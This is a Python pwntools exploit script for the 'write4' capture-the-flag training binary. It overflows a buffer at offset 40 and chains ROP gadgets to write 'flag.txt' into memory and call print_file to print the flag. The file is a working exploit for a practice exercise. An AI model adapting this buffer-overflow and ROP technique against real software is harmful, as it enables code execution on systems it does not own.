import time

from pwn import *


EXECUTABLE = "./write4"
context.binary = elf = ELF(EXECUTABLE)
lib_write4 = ELF("./libwrite4.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr)
    log.success(f"Offset found: {offset}")
    exit()


mov_ptr_r14 = elf.symbols.usefulGadgets # mov qword ptr [r14], r15; ret
flag_addr   = elf.symbols.data_start
filename    = b"flag.txt"

rop = ROP(elf)
# Move string into the data section
rop(r14=flag_addr, r15=filename)
rop.raw(mov_ptr_r14)
rop(r14=flag_addr + 8, r15=0)
rop.raw(mov_ptr_r14)

# Call print file
rop.print_file(flag_addr)


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))
p.recvline() # Thank you

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
